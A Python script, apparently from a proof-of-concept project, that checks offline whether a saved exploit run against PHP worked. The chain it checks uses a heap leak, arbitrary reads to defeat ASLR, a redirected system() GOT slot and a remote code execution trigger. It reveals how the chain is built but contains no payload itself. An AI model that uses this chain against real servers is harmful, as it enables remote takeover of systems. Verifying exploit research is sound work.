#!/usr/bin/env python3
"""Offline verifier for a saved full-chain evidence bundle."""
from __future__ import annotations

import argparse
import hashlib
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(ROOT))

from poc.build_payload import build_heap_leak  # noqa: E402


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--evidence", type=Path, default=ROOT / "evidence" / "aslr-chain")
    args = parser.parse_args()
    evidence = args.evidence.resolve()
    result = json.loads((evidence / "result.json").read_text(encoding="utf-8"))
    trace = json.loads((evidence / "trace.json").read_text(encoding="utf-8"))
    profile = json.loads((HERE / "rebase_profile.json").read_text(encoding="utf-8"))
    failures: list[str] = []

    def require(condition: bool, message: str) -> None:
        if not condition:
            failures.append(message)

    require(result.get("success") is True, "result.success is not true")
    require(result.get("proc_maps_used") is False, "ASLR case used proc maps")
    require(result.get("proc_mem_used") is False, "ASLR case used proc memory")
    require(result.get("address_source") == "heap leak and arbitrary-read responses only", "address source changed")
    require(result.get("total_requests") == 15, "request count changed")
    require(len(trace) == 15, "trace length changed")

    expected_labels = [
        "heap-leak", "heap-window", "php-elf", "php-build-id", "php-iconv-got",
        "libc-elf", "libc-build-id", "php-dt-debug", "loader-elf", "loader-build-id",
        "rtld-pthread-pointer", "pthread-elf", "pthread-build-id", "pthread-system-got",
        "rce-trigger",
    ]
    require([row.get("label") for row in trace] == expected_labels, "trace labels changed")

    php_base = int(result["php_base"], 16)
    libc_base = int(result["libc_base"], 16)
    loader_base = int(result["loader_base"], 16)
    pthread_base = int(result["pthread_base"], 16)
    iconv_pointer = int(result["iconv_pointer"], 16)
    r_debug = int(result["r_debug"], 16)
    rtld_global = int(result["rtld_global"], 16)
    pthread_pointer = int(result["pthread_pointer"], 16)
    system_slot = int(result["system_slot"], 16)
    system_target = int(result["system_slot_target"], 16)
    expected_system = int(result["expected_system"], 16)

    require(iconv_pointer - libc_base == int(profile["libc"]["iconv_symbol_offset"], 0), "libc/iconv arithmetic mismatch")
    require(r_debug - loader_base == int(profile["loader"]["r_debug_offset"], 0), "loader/r_debug arithmetic mismatch")
    require(rtld_global - loader_base == int(profile["loader"]["rtld_global_offset"], 0), "_rtld_global arithmetic mismatch")
    require(pthread_pointer - pthread_base == int(profile["pthread"]["mutex_lock_symbol_offset"], 0), "pthread pointer arithmetic mismatch")
    require(system_slot - pthread_base == int(profile["pthread"]["system_got_offset"], 0), "system GOT arithmetic mismatch")
    require(expected_system - libc_base == int(profile["libc"]["system_symbol_offset"], 0), "libc system arithmetic mismatch")
    require(system_target == expected_system, "system GOT target mismatch")

    hits = result.get("php_anchor_hits", [])
    require(len(hits) == 1, "PHP anchor is not unique")
    if len(hits) == 1:
        require(int(hits[0]["pointer"], 16) - php_base == int(profile["php"]["zval_ptr_dtor_offset"], 0), "PHP anchor arithmetic mismatch")

    trace_by_label = {row["label"]: row for row in trace}
    for component in ("php", "libc", "loader", "pthread"):
        static = result["static_files"][component]
        require(static["sha256"] == profile[component]["sha256"], f"{component} file hash mismatch")
        require(static["build_id"] == profile[component]["build_id"], f"{component} static Build ID mismatch")
        cell = trace_by_label[f"{component}-build-id"].get("cell_hex")
        require(cell == profile[component]["build_id"], f"{component} exploit-read Build ID mismatch")
        require(trace_by_label[f"{component}-elf"].get("cell_hex") == "7f454c46", f"{component} ELF magic mismatch")

    leak = (evidence / "heap-leak.bin").read_bytes()
    trigger = (evidence / "trigger.bin").read_bytes()
    require(leak == build_heap_leak(), "saved heap leak differs from builder")
    require(len(trigger) == 176, "saved trigger length changed")
    require(digest(trigger) == result["trigger_payload_sha256"], "saved trigger SHA-256 mismatch")
    require(digest(trigger) == trace_by_label["rce-trigger"]["payload_sha256"], "trace trigger SHA-256 mismatch")
    require(result.get("marker_created") is True, "marker was not created")
    require(bool(result.get("workers_exited")), "no exploited worker exit recorded")
    require(bool(result.get("replacement_workers")), "no replacement worker recorded")

    report = {
        "offline_only": True,
        "confirmed": not failures,
        "requests": len(trace),
        "php_base": hex(php_base),
        "libc_base": hex(libc_base),
        "loader_base": hex(loader_base),
        "pthread_base": hex(pthread_base),
        "system_slot": hex(system_slot),
        "trigger_bytes": len(trigger),
        "trigger_sha256": digest(trigger),
        "failures": failures,
    }
    print(json.dumps(report, indent=2))
    return 0 if not failures else 1


if __name__ == "__main__":
    raise SystemExit(main())
